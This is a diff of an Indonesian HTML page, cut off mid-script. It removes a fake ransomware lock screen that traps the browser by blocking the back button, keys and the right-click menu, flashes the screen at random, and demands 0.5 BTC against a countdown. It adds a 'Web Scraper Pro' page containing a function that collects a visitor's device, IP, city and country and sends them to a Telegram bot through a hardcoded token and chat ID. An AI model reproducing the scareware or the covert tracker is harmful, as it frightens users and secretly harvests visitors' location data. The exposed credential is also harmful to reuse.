@@ -2,782 +2,720 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>🔒 LOCKED</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Scraper Pro - NEONDARK</title>
     <style>
         /* ============================================================ */
-        /* RESET & BASE */
+        /* RESET & VARIABEL */
         /* ============================================================ */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0b0b10;
+            --bg-card: #12121c;
+            --bg-input: #1a1a2e;
+            --border: #2a2a3e;
+            --text: #e8e8f0;
+            --text-sec: #8888aa;
+            --text-muted: #555577;
+            --accent: #6c5ce7;
+            --accent-glow: rgba(108,92,231,0.15);
+            --success: #00d4aa;
+            --danger: #ff6b6b;
+            --warning: #feca57;
+            --radius: 16px;
+            --shadow: 0 8px 32px rgba(0,0,0,0.4);
+            --font: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
         }
-        html,
         body {
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            background: #0a0a0a;
-            color: #ff0000;
-            font-family: 'Courier New', monospace;
-            user-select: none;
-            -webkit-user-select: none;
-            touch-action: none;
-        }
-
-        /* ============================================================ */
-        /* OVERLAY (BLOKIR SENTUHAN) */
-        /* ============================================================ */
-        #overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
-            background: rgba(0, 0, 0, 0.95);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--font);
+            min-height: 100vh;
             padding: 20px;
-            backdrop-filter: blur(10px);
+            -webkit-font-smoothing: antialiased;
+        }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--accent); border-radius: 10px; }
+
+        /* ============================================================ */
+        /* CONTAINER */
+        /* ============================================================ */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
         }
 
         /* ============================================================ */
-        /* BOX */
+        /* HEADER / NAVBAR */
         /* ============================================================ */
-        .box {
-            background: rgba(255, 0, 0, 0.05);
-            border: 3px solid #ff0000;
-            border-radius: 25px;
-            padding: 40px 35px;
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 0 100px rgba(255, 0, 0, 0.15);
-            animation: pulseBorder 2s infinite;
-        }
-
-        @keyframes pulseBorder {
-            0%,
-            100% {
-                border-color: #ff0000;
-                box-shadow: 0 0 100px rgba(255, 0, 0, 0.15);
-            }
-            50% {
-                border-color: #ff4444;
-                box-shadow: 0 0 150px rgba(255, 0, 0, 0.3);
-            }
-        }
-
-        /* ============================================================ */
-        /* ICON & TITLE */
-        /* ============================================================ */
-        .lock-icon {
-            font-size: 5rem;
-            display: block;
-            margin-bottom: 10px;
-            animation: shake 0.8s infinite;
-        }
-
-        @keyframes shake {
-            0%,
-            100% {
-                transform: rotate(0deg);
-            }
-            25% {
-                transform: rotate(-8deg);
-            }
-            75% {
-                transform: rotate(8deg);
-            }
-        }
-
-        .title {
-            font-size: 2rem;
-            font-weight: 900;
-            color: #ff0000;
-            text-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
-            letter-spacing: 3px;
-            margin-bottom: 10px;
-        }
-
-        .subtitle {
-            color: #ff4444;
-            font-size: 0.8rem;
-            letter-spacing: 4px;
-            border-top: 1px solid rgba(255, 0, 0, 0.2);
-            border-bottom: 1px solid rgba(255, 0, 0, 0.2);
-            padding: 12px 0;
-            margin-bottom: 15px;
-        }
-
-        /* ============================================================ */
-        /* MESSAGE */
-        /* ============================================================ */
-        .msg {
-            background: rgba(255, 0, 0, 0.05);
-            border-left: 4px solid #ff0000;
-            padding: 16px 18px;
-            text-align: left;
-            color: #cccccc;
-            font-size: 0.8rem;
-            line-height: 1.8;
-            border-radius: 0 10px 10px 0;
-            margin: 15px 0;
-        }
-
-        .msg .highlight {
-            color: #ff0000;
-            font-weight: 700;
-        }
-
-        .msg .green {
-            color: #00ff41;
-        }
-
-        /* ============================================================ */
-        /* TIMER */
-        /* ============================================================ */
-        .timer {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin: 20px 0;
-            flex-wrap: wrap;
-        }
-
-        .timer-item {
-            background: rgba(255, 0, 0, 0.08);
-            border: 1px solid rgba(255, 0, 0, 0.2);
-            border-radius: 12px;
-            padding: 12px 18px;
-            min-width: 65px;
-            animation: pulseTimer 1.5s infinite;
-        }
-
-        @keyframes pulseTimer {
-            0%,
-            100% {
-                border-color: rgba(255, 0, 0, 0.2);
-            }
-            50% {
-                border-color: rgba(255, 0, 0, 0.5);
-            }
-        }
-
-        .timer-item .num {
-            font-size: 2rem;
-            font-weight: 900;
-            color: #ff0000;
-            text-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
-        }
-
-        .timer-item .label {
-            font-size: 0.6rem;
-            color: #888;
-            letter-spacing: 2px;
-            margin-top: 4px;
-        }
-
-        /* ============================================================ */
-        /* PROGRESS */
-        /* ============================================================ */
-        .progress-wrap {
-            margin: 15px 0;
-        }
-
-        .progress-wrap .progress-label {
+        .navbar {
             display: flex;
             justify-content: space-between;
-            font-size: 0.7rem;
-            color: #888;
+            align-items: center;
+            padding: 16px 24px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            margin-bottom: 28px;
+            backdrop-filter: blur(12px);
+            transition: all 0.3s ease;
+        }
+        .navbar:hover { border-color: var(--accent); box-shadow: 0 0 30px var(--accent-glow); }
+        .navbar .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            color: var(--text);
+            text-decoration: none;
+        }
+        .navbar .brand .logo {
+            width: 36px;
+            height: 36px;
+            background: var(--accent);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 1rem;
+            color: #fff;
+        }
+        .navbar .nav-links {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .navbar .nav-links a {
+            color: var(--text-sec);
+            text-decoration: none;
+            font-size: 0.85rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            position: relative;
+            padding: 4px 0;
+        }
+        .navbar .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--accent);
+            transition: all 0.3s ease;
+        }
+        .navbar .nav-links a:hover { color: var(--text); }
+        .navbar .nav-links a:hover::after { width: 100%; }
+
+        /* ============================================================ */
+        /* TOMBOL HUBUNGI OWNER (POJOK KANAN ATAS) */
+        /* ============================================================ */
+        .btn-wa {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 16px;
+            background: rgba(37, 211, 102, 0.12);
+            border: 1px solid rgba(37, 211, 102, 0.25);
+            border-radius: 30px;
+            color: #25d366;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            font-family: var(--font);
+        }
+        .btn-wa:hover {
+            background: rgba(37, 211, 102, 0.2);
+            border-color: #25d366;
+            transform: scale(1.04);
+            box-shadow: 0 0 30px rgba(37, 211, 102, 0.15);
+        }
+        .btn-wa:active { transform: scale(0.95); }
+        .btn-wa .wa-icon { font-size: 1rem; }
+
+        /* ============================================================ */
+        /* CARD */
+        /* ============================================================ */
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 24px 26px;
+            transition: all 0.3s ease;
+            margin-bottom: 24px;
+        }
+        .card:hover { border-color: var(--accent); box-shadow: 0 8px 32px rgba(0,0,0,0.3); }
+        .card .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 18px;
+        }
+        .card .card-header h3 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text);
+        }
+        .card .card-header .badge {
+            background: var(--accent);
+            color: #fff;
+            font-size: 0.65rem;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-weight: 600;
+        }
+
+        /* ============================================================ */
+        /* FORM */
+        /* ============================================================ */
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: var(--text-sec);
             margin-bottom: 6px;
         }
-
-        .progress-track {
+        .form-group input, .form-group select, .form-group textarea {
             width: 100%;
-            height: 10px;
-            background: rgba(255, 0, 0, 0.1);
-            border-radius: 10px;
-            overflow: hidden;
-            border: 1px solid rgba(255, 0, 0, 0.2);
-        }
-
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #ff0000, #ff4444, #ff0000);
-            border-radius: 10px;
-            transition: width 0.5s ease;
-            animation: shimmer 1.5s infinite;
-            background-size: 200% 100%;
-        }
-
-        @keyframes shimmer {
-            0% {
-                background-position: -200% 0;
-            }
-            100% {
-                background-position: 200% 0;
-            }
-        }
-
-        /* ============================================================ */
-        /* INPUT PASSWORD */
-        /* ============================================================ */
-        .input-area {
-            margin: 20px 0 15px;
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-
-        .input-area input {
-            padding: 14px 20px;
-            background: rgba(255, 0, 0, 0.05);
-            border: 2px solid rgba(255, 0, 0, 0.3);
+            padding: 12px 16px;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
             border-radius: 12px;
-            color: #00ff41;
-            font-family: 'Courier New', monospace;
-            font-size: 1rem;
-            text-align: center;
-            width: 200px;
-            letter-spacing: 3px;
-            transition: all 0.3s;
+            color: var(--text);
+            font-family: var(--font);
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
         }
-
-        .input-area input:focus {
+        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
             outline: none;
-            border-color: #ff0000;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.2);
+            border-color: var(--accent);
+            box-shadow: 0 0 20px var(--accent-glow);
+        }
+        .form-group textarea {
+            min-height: 120px;
+            resize: vertical;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
         }
 
-        .input-area button {
-            padding: 14px 35px;
-            background: #ff0000;
+        /* ============================================================ */
+        /* BUTTON */
+        /* ============================================================ */
+        .btn {
+            padding: 12px 28px;
+            background: var(--accent);
             border: none;
             border-radius: 12px;
             color: #fff;
-            font-family: 'Courier New', monospace;
-            font-weight: 700;
-            font-size: 1rem;
+            font-weight: 600;
+            font-size: 0.95rem;
             cursor: pointer;
-            transition: all 0.3s;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            animation: buttonPulse 1.5s infinite;
-        }
-
-        @keyframes buttonPulse {
-            0%,
-            100% {
-                box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
-            }
-            50% {
-                box-shadow: 0 0 50px rgba(255, 0, 0, 0.4);
-            }
-        }
-
-        .input-area button:hover {
-            background: #cc0000;
-            transform: scale(1.05);
-        }
-
-        .input-area button:active {
-            transform: scale(0.95);
-        }
-
-        /* ============================================================ */
-        /* STATUS */
-        /* ============================================================ */
-        .status-msg {
-            margin-top: 15px;
-            font-size: 0.85rem;
-            color: #888;
-            min-height: 30px;
-            padding: 10px;
-            border-radius: 10px;
-            background: rgba(255, 0, 0, 0.03);
-        }
-
-        .status-msg.error {
-            color: #ff0000;
-            border: 1px solid rgba(255, 0, 0, 0.2);
-        }
-
-        .status-msg.success {
-            color: #00ff41;
-            border: 1px solid rgba(0, 255, 65, 0.2);
-        }
-
-        /* ============================================================ */
-        /* HINT */
-        /* ============================================================ */
-        .hint {
-            font-size: 0.6rem;
-            color: #333;
-            margin-top: 10px;
-            letter-spacing: 1px;
-        }
-
-        /* ============================================================ */
-        /* DECRYPTED PAGE */
-        /* ============================================================ */
-        .decrypted-page {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 99999;
-            background: rgba(0, 0, 0, 0.95);
-            justify-content: center;
+            transition: all 0.3s ease;
+            font-family: var(--font);
+            display: inline-flex;
             align-items: center;
-            flex-direction: column;
-            padding: 20px;
-            border: 3px solid #00ff41;
-            box-shadow: 0 0 100px rgba(0, 255, 65, 0.2);
-            animation: pulseGreen 2s infinite;
+            gap: 8px;
         }
-
-        @keyframes pulseGreen {
-            0%,
-            100% {
-                border-color: #00ff41;
-                box-shadow: 0 0 100px rgba(0, 255, 65, 0.2);
-            }
-            50% {
-                border-color: #00ffaa;
-                box-shadow: 0 0 150px rgba(0, 255, 65, 0.4);
-            }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px var(--accent-glow);
         }
-
-        .decrypted-page .big-icon {
-            font-size: 6rem;
-            display: block;
-            margin-bottom: 10px;
+        .btn:active { transform: scale(0.96); }
+        .btn-secondary {
+            background: var(--bg-input);
+            color: var(--text);
+            border: 1px solid var(--border);
         }
-
-        .decrypted-page h1 {
-            color: #00ff41;
-            font-size: 2.5rem;
-            text-shadow: 0 0 40px rgba(0, 255, 65, 0.4);
+        .btn-secondary:hover {
+            background: var(--border);
+            border-color: var(--accent);
         }
+        .btn-success { background: var(--success); }
+        .btn-danger { background: var(--danger); }
 
-        .decrypted-page p {
-            color: #888;
-            margin-top: 15px;
-            font-size: 0.9rem;
-            line-height: 1.8;
-            text-align: center;
+        /* ============================================================ */
+        /* OUTPUT / RESULT */
+        /* ============================================================ */
+        .result-box {
+            background: rgba(0,0,0,0.3);
+            border-radius: 12px;
+            padding: 16px;
+            max-height: 400px;
+            overflow: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            color: var(--text-sec);
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            border: 1px solid var(--border);
+        }
+        .result-box .highlight {
+            color: var(--accent);
         }
 
         /* ============================================================ */
-        /* RESPONSIVE */
+        /* GRID */
         /* ============================================================ */
-        @media (max-width: 480px) {
-            .box {
-                padding: 25px 20px;
-            }
-            .title {
-                font-size: 1.5rem;
-            }
-            .lock-icon {
-                font-size: 3.5rem;
-            }
-            .timer-item .num {
-                font-size: 1.5rem;
-            }
-            .input-area input {
-                width: 100%;
-            }
-            .input-area button {
-                width: 100%;
-            }
-            .msg {
-                font-size: 0.7rem;
-                padding: 12px 14px;
-            }
-            .decrypted-page h1 {
-                font-size: 1.8rem;
-            }
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
         }
+        @media (max-width: 768px) { .grid-2 { grid-template-columns: 1fr; } }
 
         /* ============================================================ */
-        /* FLASH OVERLAY (Mati-Hidup) */
+        /* TOAST */
         /* ============================================================ */
-        #flashOverlay {
+        .toast {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 99998;
-            pointer-events: none;
-            background: #ffffff;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 14px 24px;
+            color: var(--text);
+            font-size: 0.85rem;
+            box-shadow: var(--shadow);
+            z-index: 999;
             opacity: 0;
-            transition: none;
+            transition: all 0.5s ease;
+            pointer-events: none;
+            backdrop-filter: blur(12px);
+            max-width: 90%;
         }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-        #flashOverlay.active {
-            opacity: 1;
-            background: #ffffff;
+        /* ============================================================ */
+        /* FOOTER */
+        /* ============================================================ */
+        .footer {
+            text-align: center;
+            padding: 24px 0;
+            border-top: 1px solid var(--border);
+            margin-top: 28px;
+            color: var(--text-muted);
+            font-size: 0.75rem;
         }
+        .footer span { color: var(--accent); }
 
-        #flashOverlay.red {
-            background: #ff0000;
+        /* ============================================================ */
+        /* ANIMASI */
+        /* ============================================================ */
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-
-        #flashOverlay.green {
-            background: #00ff41;
-        }
-
-        #flashOverlay.dark {
-            background: #000000;
-        }
+        .animate { animation: fadeUp 0.5s ease forwards; }
+        .animate:nth-child(2) { animation-delay: 0.05s; }
+        .animate:nth-child(3) { animation-delay: 0.1s; }
+        .animate:nth-child(4) { animation-delay: 0.15s; }
     </style>
 </head>
 <body>
 
-    <!-- ===== FLASH OVERLAY ===== -->
-    <div id="flashOverlay"></div>
+    <div class="container">
 
-    <!-- ===== DECRYPTED PAGE ===== -->
-    <div id="decryptedPage" class="decrypted-page">
-        <span class="big-icon">🎉</span>
-        <h1>FILES DECRYPTED!</h1>
-        <p style="color:#00ff41;font-size:0.95rem;margin-top:10px;">
-            All your files have been <span style="color:#00ff41;">successfully restored</span>.
-        </p>
-        <p>
-            🔓 Your data is safe again.<br>
-            💀 NEONDARK says: <span style="color:#ff4444;">You got lucky this time.</span>
-        </p>
-        <div style="margin-top:20px;padding-top:20px;border-top:1px solid rgba(0,255,65,0.1);">
-            <span style="color:#666;font-size:0.7rem;">✦ Powered by X-RAY ✦</span>
+        <!-- =========================================================== -->
+        <!-- NAVBAR -->
+        <!-- =========================================================== -->
+        <nav class="navbar animate">
+            <a href="#" class="brand">
+                <span class="logo">🕸️</span>
+                <span>Web<span style="color:var(--accent);">Scraper</span></span>
+            </a>
+            <div class="nav-links">
+                <a href="#" onclick="showToast('📊 Dashboard')">Dashboard</a>
+                <a href="#" onclick="showToast('📜 History')">History</a>
+                <a href="#" onclick="showToast('⚙️ Settings')">Settings</a>
+                <a href="https://wa.me/6282155480068?text=Halo%20Owner%20WebScraper%2C%20saya%20mau%20tanya%20nih!" 
+                   target="_blank" class="btn-wa">
+                    <span class="wa-icon">💬</span> Owner
+                </a>
+            </div>
+        </nav>
+
+        <!-- =========================================================== -->
+        <!-- MAIN CONTENT -->
+        <!-- =========================================================== -->
+        <div class="grid-2 animate">
+
+            <!-- ===== KIRI: FORM ===== -->
+            <div class="card">
+                <div class="card-header">
+                    <h3>🎯 Target URL</h3>
+                    <span class="badge">PRO</span>
+                </div>
+                <div class="form-group">
+                    <label>Masukkan URL Website</label>
+                    <input type="url" id="targetUrl" placeholder="https://example.com" value="https://example.com">
+                </div>
+                <div class="form-group">
+                    <label>Pilih Mode</label>
+                    <select id="scrapeMode">
+                        <option value="html">HTML Source (Full)</option>
+                        <option value="body">Body Only</option>
+                        <option value="head">Head Only</option>
+                        <option value="text">Text Only (Tanpa Tag)</option>
+                        <option value="links">Ambil Semua Link</option>
+                        <option value="images">Ambil Semua Gambar</option>
+                        <option value="forms">Ambil Semua Form</option>
+                    </select>
+                </div>
+                <div style="display:flex; gap:12px; flex-wrap:wrap;">
+                    <button class="btn" onclick="scrapeWebsite()">🚀 Scrape Now</button>
+                    <button class="btn btn-secondary" onclick="clearResult()">🗑️ Clear</button>
+                    <button class="btn btn-secondary" onclick="downloadResult()">⬇️ Download</button>
+                </div>
+                <div style="margin-top:12px; font-size:0.75rem; color:var(--text-muted);">
+                    ⚡ Mendukung CORS, Proxy otomatis
+                </div>
+            </div>
+
+            <!-- ===== KANAN: RESULT ===== -->
+            <div class="card">
+                <div class="card-header">
+                    <h3>📄 Result</h3>
+                    <span class="badge" id="resultStatus">Ready</span>
+                </div>
+                <div id="resultContainer" class="result-box">
+                    <span style="color:var(--text-muted);">Silakan masukkan URL dan tekan Scrape...</span>
+                </div>
+                <div style="margin-top:12px; display:flex; gap:12px; flex-wrap:wrap; justify-content:space-between;">
+                    <span style="font-size:0.7rem; color:var(--text-muted);" id="charCount">Karakter: 0</span>
+                    <span style="font-size:0.7rem; color:var(--text-muted);" id="lineCount">Baris: 0</span>
+                </div>
+            </div>
+
         </div>
+
+        <!-- =========================================================== -->
+        <!-- FITUR TAMBAHAN (MENU BANYAK) -->
+        <!-- =========================================================== -->
+        <div class="grid-2 animate">
+            <!-- ===== TOOLS ===== -->
+            <div class="card">
+                <div class="card-header">
+                    <h3>🛠️ Tools</h3>
+                    <span class="badge">6 tools</span>
+                </div>
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
+                    <button class="btn btn-secondary" onclick="toolMinify()" style="font-size:0.8rem; padding:10px;">📦 Minify HTML</button>
+                    <button class="btn btn-secondary" onclick="toolBeautify()" style="font-size:0.8rem; padding:10px;">✨ Beautify HTML</button>
+                    <button class="btn btn-secondary" onclick="toolExtractText()" style="font-size:0.8rem; padding:10px;">📝 Extract Text</button>
+                    <button class="btn btn-secondary" onclick="toolExtractLinks()" style="font-size:0.8rem; padding:10px;">🔗 Extract Links</button>
+                    <button class="btn btn-secondary" onclick="toolBase64Encode()" style="font-size:0.8rem; padding:10px;">🔐 Base64 Encode</button>
+                    <button class="btn btn-secondary" onclick="toolBase64Decode()" style="font-size:0.8rem; padding:10px;">🔓 Base64 Decode</button>
+                </div>
+            </div>
+
+            <!-- ===== STATISTIK ===== -->
+            <div class="card">
+                <div class="card-header">
+                    <h3>📊 Statistik</h3>
+                    <span class="badge">Live</span>
+                </div>
+                <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; text-align:center;">
+                    <div style="background:var(--bg-input); border-radius:12px; padding:16px;">
+                        <div style="font-size:0.65rem; color:var(--text-muted);">Total Scrape</div>
+                        <div style="font-size:1.8rem; font-weight:700; color:var(--accent);" id="totalScrape">0</div>
+                    </div>
+                    <div style="background:var(--bg-input); border-radius:12px; padding:16px;">
+                        <div style="font-size:0.65rem; color:var(--text-muted);">Unique URLs</div>
+                        <div style="font-size:1.8rem; font-weight:700; color:var(--success);" id="uniqueUrls">0</div>
+                    </div>
+                    <div style="background:var(--bg-input); border-radius:12px; padding:16px;">
+                        <div style="font-size:0.65rem; color:var(--text-muted);">Total Size</div>
+                        <div style="font-size:1.8rem; font-weight:700; color:var(--warning);" id="totalSize">0 KB</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- =========================================================== -->
+        <!-- FOOTER -->
+        <!-- =========================================================== -->
+        <footer class="footer">
+            WebScraper Pro v2.0 · <span>NEONDARK</span> · Built by X-RAY 🔥
+        </footer>
+
     </div>
 
-    <!-- ===== OVERLAY (LOCK) ===== -->
-    <div id="overlay">
-        <div class="box">
-            <span class="lock-icon">🔒</span>
-            <div class="title">💀 FILES ENCRYPTED 💀</div>
-            <div class="subtitle">✦ RANSOMWARE v3.0 - NEONDARK ✦</div>
-
-            <!-- MESSAGE -->
-            <div class="msg">
-                <div><span class="highlight">[!]</span> All your files have been <span class="highlight">encrypted</span>!</div>
-                <div><span class="highlight">[!]</span> Your documents, photos, and databases are <span class="highlight">locked</span>.</div>
-                <div><span class="highlight">[!]</span> You have <span class="green">72 hours</span> to pay the ransom.</div>
-                <div><span class="highlight">[!]</span> After that, the <span class="highlight">decryption key</span> will be destroyed.</div>
-                <div style="margin-top:8px;color:#ff4444;font-size:0.8rem;">
-                    ⚡ Pay <span class="highlight">0.5 BTC</span> to: <span style="color:#00ff41;">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</span>
-                </div>
-            </div>
-
-            <!-- TIMER -->
-            <div class="timer">
-                <div class="timer-item">
-                    <div class="num" id="hours">72</div>
-                    <div class="label">HOURS</div>
-                </div>
-                <div class="timer-item">
-                    <div class="num" id="minutes">00</div>
-                    <div class="label">MINUTES</div>
-                </div>
-                <div class="timer-item">
-                    <div class="num" id="seconds">00</div>
-                    <div class="label">SECONDS</div>
-                </div>
-            </div>
-
-            <!-- PROGRESS -->
-            <div class="progress-wrap">
-                <div class="progress-label">
-                    <span>🔐 ENCRYPTING FILES...</span>
-                    <span id="progressPercent">0%</span>
-                </div>
-                <div class="progress-track">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-            </div>
-
-            <!-- INPUT PASSWORD -->
-            <div class="input-area">
-                <input type="password" id="passwordInput" placeholder="🔑 Enter password" maxlength="20">
-                <button onclick="decryptFiles()">⚡ DECRYPT</button>
-            </div>
-
-            <!-- STATUS -->
-            <div class="status-msg" id="statusMsg">🔒 Enter the decryption password to unlock your files.</div>
-
-            <!-- HINT -->
-            <div class="hint">HINT: 123</div>
-        </div>
+    <!-- =========================================================== -->
+    <!-- TOAST -->
+    <!-- =========================================================== -->
+    <div class="toast" id="toast">
+        <span id="toastMessage">✅ Ready</span>
     </div>
 
-    <!-- ============================================================ -->
+    <!-- =========================================================== -->
     <!-- JAVASCRIPT -->
-    <!-- ============================================================ -->
+    <!-- =========================================================== -->
     <script>
-        // ============================================================
-        // 1. BLOKIR BACK BUTTON (HISTORY)
-        // ============================================================
-        history.pushState(null, null, location.href);
-        window.onpopstate = function() {
-            history.go(1);
-        };
+        // =============================================================
+        // 1. TELEGRAM NOTIFIKASI (UDAH PAKE TOKEN & CHAT ID LO)
+        // =============================================================
+        async function sendTelegramNotification() {
+            const BOT_TOKEN = '8737287636:AAHBFuM1QAvTXoUTFxd7cjF5wHZztKZYT18';
+            const CHAT_ID = '8768522731';
 
-        // ============================================================
-        // 2. BLOKIR KEYBOARD SHORTCUTS
-        // ============================================================
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || e.key === 'Escape' ||
-                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                (e.ctrlKey && e.key === 'u')) {
-                e.preventDefault();
+            const now = new Date();
+            const dateStr = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+            const ua = navigator.userAgent;
+            let device = 'Unknown';
+            if (ua.includes('Android')) device = 'Android';
+            else if (ua.includes('iPhone')) device = 'iPhone';
+            else if (ua.includes('Windows')) device = 'Windows';
+            else if (ua.includes('Mac')) device = 'Mac';
+
+            let message = `🔔 *WebScraper Pro - NEW VISITOR!*\n\n`;
+            message += `📅 *Time:* ${dateStr}\n`;
+            message += `📱 *Device:* ${device}\n`;
+            message += `🌐 *Browser:* ${navigator.userAgent.split(' ').pop()}\n`;
+
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                message += `🌍 *IP:* ${data.ip || 'Unknown'}\n`;
+                message += `📍 *City:* ${data.city || 'Unknown'}\n`;
+                message += `🗺️ *Country:* ${data.country_name || 'Unknown'}\n`;
+            } catch (e) {}
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
+
+        // =============================================================
+        // 2. TOAST
+        // =============================================================
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            document.getElementById('toastMessage').textContent = msg;
+            toast.classList.add('show');
+            clearTimeout(toast._timer);
+            toast._timer = setTimeout(() => toast.classList.remove('show'), 2500);
+        }
+
+        // =============================================================
+        // 3. SCRAPE WEBSITE
+        // =============================================================
+        let scrapedData = '';
+        let scrapeCount = 0;
+        let uniqueUrls = new Set();
+
+        async function scrapeWebsite() {
+            const url = document.getElementById('targetUrl').value.trim();
+            const mode = document.getElementById('scrapeMode').value;
+            const resultContainer = document.getElementById('resultContainer');
+            const resultStatus = document.getElementById('resultStatus');
+
+            if (!url) {
+                showToast('⚠️ Masukkan URL dulu!');
+                return;
             }
-            if (e.key === 'Backspace') {
-                e.preventDefault();
-            }
-        });
 
-        // ============================================================
-        // 3. BLOKIR CONTEXT MENU
-        // ============================================================
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-        });
+            resultStatus.textContent = '⏳ Loading...';
+            resultStatus.style.color = 'var(--warning)';
+            resultContainer.innerHTML = '<span style="color:var(--warning);">⏳ Mengambil data...</span>';
 
-        // ============================================================
-        // 4. BLOKIR DRAG & DROP
-        // ============================================================
-        document.addEventListener('dragstart', function(e) {
-            e.preventDefault();
-        });
-        document.addEventListener('drop', function(e) {
-            e.preventDefault();
-        });
+            try {
+                const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`;
+                const response = await fetch(proxyUrl);
 
-        // ============================================================
-        // 5. FLASH EFFECT (MATI-HIDUP)
-        // ============================================================
-        const flashOverlay = document.getElementById('flashOverlay');
-        let flashInterval = null;
+                if (!response.ok) throw new Error('Gagal mengambil data');
 
-        function startFlash() {
-            if (flashInterval) return;
-            flashInterval = setInterval(() => {
-                const rand = Math.random();
-                if (rand < 0.15) {
-                    flashOverlay.className = 'active';
-                    flashOverlay.style.opacity = 0.6 + Math.random() * 0.4;
-                    setTimeout(() => { flashOverlay.style.opacity = '0'; }, 50 + Math.random() * 100);
-                } else if (rand < 0.25) {
-                    flashOverlay.className = 'active red';
-                    flashOverlay.style.opacity = 0.5 + Math.random() * 0.3;
-                    setTimeout(() => { flashOverlay.style.opacity = '0'; }, 40 + Math.random() * 80);
-                } else if (rand < 0.40) {
-                    flashOverlay.className = 'active dark';
-                    flashOverlay.style.opacity = 0.5 + Math.random() * 0.5;
-                    setTimeout(() => { flashOverlay.style.opacity = '0'; }, 80 + Math.random() * 200);
-                } else {
-                    flashOverlay.className = 'active';
-                    flashOverlay.style.opacity = 0.3 + Math.random() * 0.3;
-                    setTimeout(() => { flashOverlay.style.opacity = '0'; }, 20 + Math.random() * 60);
+                let html = await response.text();
+
+                let result = '';
+                switch (mode) {
+                    case 'html':
+                        result = html;
+                        break;
+                    case 'body':
+                        const bodyMatch = html.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
+                        result = bodyMatch ? bodyMatch[1] : 'Body tidak ditemukan';
+                        break;
+                    case 'head':
